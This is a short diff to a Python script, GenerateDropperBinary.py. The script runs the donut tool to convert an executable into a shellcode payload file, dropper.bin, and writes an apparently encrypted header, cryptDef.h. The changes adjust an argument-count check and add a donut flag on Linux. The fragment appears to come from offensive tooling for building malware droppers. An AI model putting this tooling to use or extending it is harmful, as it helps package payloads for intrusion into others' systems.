@@ -46,7 +46,7 @@ def main(argv):
         fileEncrypt = open('cryptDef.h', 'w')
         fileClear = open('clearDef.h', 'r')
 
-        if(len(argv)<3):
+        if(len(argv)<4):
                 print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
                 print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
                 exit()
@@ -75,7 +75,7 @@ def main(argv):
         if os.name == 'nt':
                 args = ('.\\ressources\\donut.exe', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', '.\\dropper.bin', binary)
         else:   
-                args = ('./ressources/donut', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', './dropper.bin', binary)
+                args = ('./ressources/donut', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', './dropper.bin', '-i' , binary)
         popen = subprocess.Popen(args, stdout=subprocess.PIPE)
         popen.wait()
         output = popen.stdout.read()
